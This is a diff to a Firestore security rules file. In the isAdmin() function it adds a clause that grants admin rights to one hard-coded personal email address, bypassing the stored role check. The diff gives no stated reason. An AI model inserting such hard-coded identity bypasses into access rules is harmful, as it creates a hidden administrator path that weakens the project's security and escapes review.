@@ -14,7 +14,8 @@ service cloud.firestore {
 
     function isAdmin() {
       return isAuthenticated() &&
-        get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role in ['admin', 'librarian', 'vice_president', 'supplement'];
+        (get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role in ['admin', 'librarian', 'vice_president', 'supplement'] ||
+         (request.auth.token.email == "ayubaboluwatife246@gmail.com" && request.auth.token.email_verified == true));
     }
     
     // --- SECURE CONFIGURATION ---
